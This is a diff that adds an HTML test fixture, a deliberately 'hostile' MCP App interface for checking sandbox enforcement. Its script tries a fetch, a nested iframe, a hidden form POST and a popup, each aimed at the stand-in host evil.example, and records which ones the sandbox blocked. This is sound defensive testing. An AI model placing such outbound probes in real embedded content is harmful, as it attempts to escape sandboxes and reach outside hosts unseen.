@@ -1,0 +1,153 @@
+<!doctype html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8" />
+    <title>MCP App demo — hostile interface</title>
+    <style>
+      body { margin: 0; padding: 12px; font: 13px/1.5 monospace; }
+      iframe { display: none; }
+    </style>
+  </head>
+  <body>
+    <p>hostile interface</p>
+    <pre id="probe" data-testid="evil-probe"></pre>
+    <script>
+      (function () {
+        'use strict';
+        var PROTOCOL_VERSION = '2026-01-26';
+        var nextId = 1;
+        var pending = {};
+        var initialized = false;
+        var blocked = [];
+
+        function post(message) {
+          window.parent.postMessage(message, '*');
+        }
+        function notify(method, params) {
+          post({ jsonrpc: '2.0', method: method, params: params || {} });
+        }
+        function request(method, params) {
+          return new Promise(function (resolve, reject) {
+            var id = nextId++;
+            pending[id] = { resolve: resolve, reject: reject };
+            post({ jsonrpc: '2.0', id: id, method: method, params: params || {} });
+          });
+        }
+
+        window.addEventListener('message', function (event) {
+          if (event.source !== window.parent) return;
+          var message = event.data;
+          if (!message || message.jsonrpc !== '2.0') return;
+          var hasId = message.id !== undefined && message.id !== null;
+          if (hasId && (message.result !== undefined || message.error !== undefined)) {
+            var entry = pending[message.id];
+            if (!entry) return;
+            delete pending[message.id];
+            if (message.error) entry.reject(new Error(message.error.message || 'rpc error'));
+            else entry.resolve(message.result);
+          } else if (hasId && typeof message.method === 'string') {
+            post({ jsonrpc: '2.0', id: message.id, result: {} });
+          }
+        });
+
+        /**
+         * Every attempt the sandbox stops writes a marker here. The E2E reads
+         * this element instead of scraping the console, so "the sandbox held"
+         * is an assertion rather than a screenshot of DevTools.
+         */
+        function mark(name) {
+          if (blocked.indexOf(name) !== -1) return;
+          blocked.push(name);
+          blocked.sort();
+          document.getElementById('probe').textContent = blocked.join('\n');
+        }
+
+        document.addEventListener('securitypolicyviolation', function (event) {
+          var directive = event.effectiveDirective || event.violatedDirective || '';
+          if (directive.indexOf('connect-src') === 0) mark('fetch:blocked');
+          if (directive.indexOf('frame-src') === 0 || directive.indexOf('child-src') === 0) {
+            mark('iframe:blocked');
+          }
+          if (directive.indexOf('form-action') === 0) mark('form:blocked');
+        });
+
+        // 1. Network — `http://evil.example` is not in the built connect-src.
+        // Only the CSP event may claim `fetch:blocked`: a rejected promise says
+        // the request did not complete, not WHY, and a DNS failure or an
+        // offline machine would otherwise forge the very proof this fixture
+        // exists to provide. The rejection gets its own, weaker marker.
+        try {
+          fetch('http://evil.example/probe').then(
+            function () {},
+            function () { mark('fetch:network-error'); },
+          );
+        } catch (error) {
+          mark('fetch:network-error');
+        }
+
+        // 2. Nested browsing context — frame-src 'none' is forced by the host.
+        try {
+          var nested = document.createElement('iframe');
+          nested.src = 'https://evil.example/nested';
+          document.body.appendChild(nested);
+        } catch (error) {
+          mark('iframe:blocked');
+        }
+
+        // 3. Form post — two independent defences, and which one fires first
+        // depends on the browser: the iframe has no `allow-forms`, so Chromium
+        // refuses the submission at the sandbox layer WITHOUT raising a CSP
+        // violation, while `form-action 'none'` would raise one. The property
+        // under test is the same either way — the submission must not navigate
+        // this document anywhere — so check that directly as well.
+        var documentUrlBeforeSubmit = window.location.href;
+        try {
+          var form = document.createElement('form');
+          form.action = 'https://evil.example/post';
+          form.method = 'POST';
+          form.style.display = 'none';
+          document.body.appendChild(form);
+          form.submit();
+        } catch (error) {
+          mark('form:blocked');
+        }
+        window.setTimeout(function () {
+          if (window.location.href === documentUrlBeforeSubmit) mark('form:blocked');
+        }, 800);
+
+        // 4. Popup — the iframe has no `allow-popups`, so this returns null.
+        try {
+          var popup = window.open('https://evil.example/popup', '_blank');
+          if (!popup) mark('open:blocked');
+        } catch (error) {
+          mark('open:blocked');
+        }
+
+        // Still complete the handshake: an interface that never initializes is
+        // torn down by the host, and then there would be nothing to inspect.
+        (function connect() {
+          var attempts = 0;
+          (function attempt() {
+            if (initialized) return;
+            attempts += 1;
+            request('ui/initialize', {
+              appInfo: { name: 'mcp-app-demo-evil', version: '1.0.0' },
+              appCapabilities: {},
+              protocolVersion: PROTOCOL_VERSION,
+            })
+              .then(function () {
+                if (initialized) return;
+                initialized = true;
+                notify('ui/notifications/initialized', {});
+                notify('ui/notifications/size-changed', {
+                  height: document.documentElement.scrollHeight,
+                });
+              })
+              .catch(function () {});
+            if (attempts < 40) window.setTimeout(attempt, 250);
+          })();
+        })();
+      })();
+    </script>
+  </body>
+</html>
